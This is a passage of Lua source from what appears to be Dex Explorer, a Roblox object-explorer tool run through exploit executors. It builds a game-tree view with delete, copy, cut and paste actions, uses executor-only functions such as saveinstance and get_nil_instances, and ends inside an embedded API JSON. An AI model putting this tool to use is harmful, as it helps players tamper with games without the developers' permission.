
			local visible = nodeIsVisible(objectNode)

			Selection:Remove(object,true)

			local parent = objectNode.Parent
			remove(parent,objectNode.Index)
			NodeLookup[object] = nil
			connLookup[object]:disconnect()
			connLookup[object] = nil

			if visible then
				updateList()
			elseif nodeIsVisible(parent) then
				updateScroll()
			end
		end

		-- Moves a tree node to a new parent. Called when an existing object's parent
		-- changes.
		local function moveObject(object,parent)
			local objectNode = NodeLookup[object]
			if not objectNode then
				return
			end

			local parentNode = NodeLookup[parent]
			if not parentNode then
				return
			end

			local visible = nodeIsVisible(objectNode)

			remove(objectNode.Parent,objectNode.Index)
			objectNode.Parent = parentNode

			objectNode.Depth = depth(object)
			local function r(node,d)
				for i = 1,#node do
					node[i].Depth = d
					r(node[i],d+1)
				end
			end
			r(objectNode,objectNode.Depth+1)

			insert(parentNode,#parentNode+1,objectNode)

			if visible or nodeIsVisible(objectNode) then
				updateList()
			elseif nodeIsVisible(objectNode.Parent) then
				updateScroll()
			end
		end

		-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
		-- This RobloxLocked object lets me index its properties for some reason

		local function check(object)
			return object.AncestryChanged
		end

		-- Creates a new tree node from an object. Called when an object starts
		-- existing in the game tree.
		local function addObject(object,noupdate)
			if script then
				-- protect against naughty RobloxLocked objects
				local s = pcall(check,object)
				if not s then
					return
				end
			end

			local parentNode = NodeLookup[object.Parent]
			if not parentNode then
				return
			end

			local objectNode = {
				Object = object;
				Parent = parentNode;
				Index = 0;
				Expanded = false;
				Selected = false;
				Depth = depth(object);
			}

			connLookup[object] = Connect(object.AncestryChanged,function(c,p)
				if c == object then
					if p == nil then
						removeObject(c)
					else
						moveObject(c,p)
					end
				end
			end)

			NodeLookup[object] = objectNode
			insert(parentNode,#parentNode+1,objectNode)

			if not noupdate then
				if nodeIsVisible(objectNode) then
					updateList()
				elseif nodeIsVisible(objectNode.Parent) then
					updateScroll()
				end
			end
		end

		local function makeObject(obj,par)
			local newObject = Instance.new(obj.ClassName)
			for i,v in pairs(obj.Properties) do
				ypcall(function()
					local newProp
					newProp = ToPropValue(v.Value,v.Type)
					newObject[v.Name] = newProp
				end)
			end
			newObject.Parent = par
		end

		local function writeObject(obj)
			local newObject = {ClassName = obj.ClassName, Properties = {}}
			for i,v in pairs(RbxApi.GetProperties(obj.className)) do
				if v["Name"] ~= "Parent" then
					print("thispassed")
					table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
				end
			end
			return newObject
		end

		local function buildDexStorage()
			local localDexStorage

			local success,err = ypcall(function()
				localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")[1]
			end)

			if success and localDexStorage then
				for i,v in pairs(localDexStorage:GetChildren()) do
					ypcall(function()
						v.Parent = DexStorageMain
					end)
				end
			end

			updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
		end

		local dexStorageDebounce = false
		local dexStorageListeners = {}

		local function updateDexStorage()
			if dexStorageDebounce then return end
			dexStorageDebounce = true	

			wait()

			pcall(function()
				saveinstance("content//DexStorage.rbxm",DexStorageMain)
			end)

			updateDexStorageListeners()

			dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
		end

		function updateDexStorageListeners()
			for i,v in pairs(dexStorageListeners) do
				v:Disconnect()
			end
			dexStorageListeners = {}
			for i,v in pairs(DexStorageMain:GetChildren()) do
				pcall(function()
					local ev = v.Changed:connect(updateDexStorage)
					table.insert(dexStorageListeners,ev)
				end)
			end
		end

		do
			NodeLookup[workspace.Parent] = {
				Object = workspace.Parent;
				Parent = nil;
				Index = 0;
				Expanded = true;
			}

			if DexStorageEnabled then
				NodeLookup[DexStorage] = {
					Object = DexStorage;
					Parent = nil;
					Index = 0;
					Expanded = true;
				}
			end

			if NilStorageEnabled then
				NodeLookup[NilStorage] = {
					Object = NilStorage;
					Parent = nil;
					Index = 0;
					Expanded = true;
				}
			end

			Connect(game.DescendantAdded,addObject)
			Connect(game.DescendantRemoving,removeObject)

			if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]

				buildDexStorage()

				Connect(DexStorage.DescendantAdded,addObject)
				Connect(DexStorage.DescendantRemoving,removeObject)

				Connect(DexStorage.DescendantAdded,updateDexStorage)
				Connect(DexStorage.DescendantRemoving,updateDexStorage)
			end

			if NilStorageEnabled then
				Connect(NilStorage.DescendantAdded,addObject)
				Connect(NilStorage.DescendantRemoving,removeObject)		

				local currentTable = get_nil_instances()	

				spawn(function()
					while wait() do
						if #currentTable ~= #get_nil_instances() then
							currentTable = get_nil_instances()
							--NilStorageMain:ClearAllChildren()
							for i,v in pairs(get_nil_instances()) do
								if v ~= NilStorage and v ~= DexStorage then
									pcall(function()
										v.Parent = NilStorageMain
									end)
							--[[
							local newNil = v
							newNil.Archivable = true
							newNil:Clone().Parent = NilStorageMain
							--]]
								end
							end
						end
					end
				end)
			end

			local function get(o)
				return o:GetChildren()
			end

			local function r(o)
				local s,children = pcall(get,o)
				if s then
					for i = 1,#children do
						addObject(children[i],true)
						r(children[i])
					end
				end
			end

			r(workspace.Parent)
			if DexStorageEnabled then
				r(DexStorage)
			end
			if NilStorageEnabled then
				r(NilStorage)
			end

			scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
			updateList()
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Actions

		local actionButtons do
			actionButtons = {}

			local totalActions = 1
			local currentActions = totalActions
			local function makeButton(icon,over,name,vis,cond)
				local buttonEnabled = false

				local button = Create(Icon('ImageButton',icon),{
					Name = name .. "Button";
					Visible = Option.Modifiable and Option.Selectable;
					Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
					Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
					Parent = headerFrame;
				})

				local tipText = Create('TextLabel',{
					Name = name .. "Text";
					Text = name;
					Visible = false;
					BackgroundTransparency = 1;
					TextXAlignment = 'Right';
					Font = FONT;
					FontSize = FONT_SIZE;
					Position = UDim2.new(0,0,0,0);
					Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
					Parent = headerFrame;
				})


				button.MouseEnter:connect(function()
					if buttonEnabled then
						button.BackgroundTransparency = 0.9
					end
					--Icon(button,over)
					--tipText.Visible = true
				end)
				button.MouseLeave:connect(function()
					button.BackgroundTransparency = 1
					--Icon(button,icon)
					--tipText.Visible = false
				end)

				currentActions = currentActions + 1
				actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
				QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
					if on then
						buttonEnabled = true
						Icon(button,over)
					else
						buttonEnabled = false
						Icon(button,icon)
					end
				end}
				return button
			end

			--local clipboard = {}
			local function delete(o)
				o.Parent = nil
			end

			makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()

			end)


			-- DELETE
			makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			end)

			-- PASTE
			makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			end)

			-- COPY
			makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			end)

			-- CUT
			makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			end)

			-- FREEZE
			makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)

			-- ADD/REMOVE STARRED
			makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)

			-- STARRED
			makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


			-- SORT
			-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Option Bindables

		do
			local optionCallback = {
				Modifiable = function(value)
					for i = 1,#actionButtons do
						actionButtons[i].Obj.Visible = value and Option.Selectable
					end
					cancelReparentDrag()
				end;
				Selectable = function(value)
					for i = 1,#actionButtons do
						actionButtons[i].Obj.Visible = value and Option.Modifiable
					end
					cancelSelectDrag()
					Selection:Set({})
				end;
			}

			local bindSetOption = explorerPanel:FindFirstChild("SetOption")
			if not bindSetOption then
				bindSetOption = Create('BindableFunction',{Name = "SetOption"})
				bindSetOption.Parent = explorerPanel
			end

			bindSetOption.OnInvoke = function(optionName,value)
				if optionCallback[optionName] then
					Option[optionName] = value
					optionCallback[optionName](value)
				end
			end

			local bindGetOption = explorerPanel:FindFirstChild("GetOption")
			if not bindGetOption then
				bindGetOption = Create('BindableFunction',{Name = "GetOption"})
				bindGetOption.Parent = explorerPanel
			end

			bindGetOption.OnInvoke = function(optionName)
				if optionName then
					return Option[optionName]
				else
					local options = {}
					for k,v in pairs(Option) do
						options[k] = v
					end
					return options
				end
			end
		end

		function SelectionVar()
			return Selection
		end

		Input.InputBegan:connect(function(key)
			if key.KeyCode == Enum.KeyCode.LeftControl then
				HoldingCtrl = true
			end
			if key.KeyCode == Enum.KeyCode.LeftShift then
				HoldingShift = true
			end
		end)

		Input.InputEnded:connect(function(key)
			if key.KeyCode == Enum.KeyCode.LeftControl then
				HoldingCtrl = false
			end
			if key.KeyCode == Enum.KeyCode.LeftShift then
				HoldingShift = false
			end
		end)

		while RbxApi == nil do
			RbxApi = GetApiRemote:Invoke()
			wait()
		end

		explorerFilter.Changed:connect(function(prop)
			if prop == "Text" then
				rawUpdateList()
			end
		end)

		CurrentInsertObjectWindow = CreateInsertObjectMenu(
			GetClasses(),
			"",
			false,
			function(option)
				CurrentInsertObjectWindow.Visible = false
				local list = SelectionVar():Get()
				for i = 1,#list do
					pcall(function() Instance.new(option,list[i]) end)
				end
				DestroyRightClick()
			end
		)
	end)
	spawn(function()
	--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

		wait(0.2)

		local print = function(s)
			print(tostring(s))
		end

		-- Services
		local Teams = game:GetService("Teams")
		local Workspace = game:GetService("Workspace")
		local Debris = game:GetService("Debris")
		local ContentProvider = game:GetService("ContentProvider")
		local Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")

		-- Functions
		function httpGet(url)
			return game:HttpGet(url,true)
		end

		-- RbxApi Stuff

		local apiUrl = "http://anaminus.github.io/rbx/json/api/latest.json"
		local maxChunkSize = 100 * 1000
		local ApiJson
		if script:FindFirstChild("RawApiJson") then
			ApiJson = script.RawApiJson
		else
			ApiJson = ""
		end


		function getLocalApiJson()
			local rawApiJson = [===[
	[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["RobloxPlaceSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"YieldFunction"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":[],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":[],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":["deprecated"],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrackState","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"revertUrl","Default":null}],"Name":"SetAssetRevertUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"versionsUrl","Default":null}],"Name":"SetAssetVersionsUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"accessUrl","Default":null}],"Name":"SetPlaceAccessUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAwardBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"seconds","Default":null}],"Name":"SetHasBadgeCooldown","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetHasBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeDisabledUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeLegalUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceId","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable","notbrowsable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"F